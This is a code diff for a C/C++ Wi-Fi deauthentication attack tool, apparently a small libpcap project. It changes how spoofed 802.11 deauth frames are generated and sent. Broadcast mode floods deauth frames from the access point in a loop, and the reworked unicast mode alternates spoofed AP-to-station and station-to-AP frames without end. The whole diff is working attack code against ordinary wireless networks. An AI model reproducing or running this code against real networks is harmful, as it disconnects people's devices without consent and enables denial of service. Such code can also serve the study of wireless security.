@@ -4,7 +4,7 @@
 #include "DeauthAttack.h"
 
 
-int do_deauth_attack(pcap_t* handle, DeauthAttack* pkt_generator);
+int do_deauth_attack(pcap_t* handle, wlan_deauth_pkt* attack_pkt);
 int do_auth_unicast(pcap_t* handle, uint8_t* ap_mac_addr, uint8_t* st_mac_addr);
 
 
@@ -34,21 +34,36 @@ int main(int argc, char* argv[])
     {
     case 3:
     {
-        DeauthAttack* pkt_gen_deauth_broadcast = new DeauthAttack(param.ap_mac_);
-        res = do_deauth_attack(handle, pkt_gen_deauth_broadcast);
-        if (res != 0)
+        DeauthAttack* pkt_gen_deauth_broadcast = new DeauthAttack(param.ap_mac_, BROADCAST_MAC_ADDR, AP_TO_BROADCAST);
+        wlan_deauth_pkt* attack_pkt = pkt_gen_deauth_broadcast->get_pkt();
+
+        while (res == 0)
         {
-            return -1;
+            res = do_deauth_attack(handle, attack_pkt);
         }
         break;
     }
     case 4:
     {
-        DeauthAttack* pkt_gen_deauth_unicast = new DeauthAttack(param.ap_mac_, param.st_mac_);
-        res = do_deauth_attack(handle, pkt_gen_deauth_unicast);
-        if (res != 0)
+        DeauthAttack* pkt_gen_deauth_unicast_ap_to_st = new DeauthAttack(param.ap_mac_, param.st_mac_, AP_TO_STATION);
+        wlan_deauth_pkt* attack_pkt_ap_to_st = pkt_gen_deauth_unicast_ap_to_st->get_pkt();
+        
+        DeauthAttack* pkt_gen_deauth_unicast_st_to_ap = new DeauthAttack(param.ap_mac_, param.st_mac_, STATION_TO_AP);
+        wlan_deauth_pkt* attack_pkt_st_to_ap = pkt_gen_deauth_unicast_st_to_ap->get_pkt();
+
+        while (true)
         {
-            return -1;
+            res = do_deauth_attack(handle, attack_pkt_ap_to_st);
+            if (res != 0)
+            {
+                break;
+            }
+            
+            res = do_deauth_attack(handle, attack_pkt_st_to_ap);
+            if (res != 0)
+            {
+                break;
+            }
         }
         break;
     }
@@ -69,17 +84,14 @@ int main(int argc, char* argv[])
 }
 
 
-int do_deauth_attack(pcap_t* handle, DeauthAttack* pkt_generator)
+int do_deauth_attack(pcap_t* handle, wlan_deauth_pkt* attack_pkt)
 {
-    wlan_deauth_pkt* attack_pkt = pkt_generator->get_pkt();
-    while (true)
+    int res = pcap_sendpacket(handle, attack_pkt->packet, attack_pkt->size);
+    if (res != 0)
     {
-        int res = pcap_sendpacket(handle, attack_pkt->packet, attack_pkt->size);
-        if (res != 0) {
-            fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
-            pcap_close(handle);
-            return -1;
-        }
+        fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+        pcap_close(handle);
+        return -1;
     }
     return 0;
 }
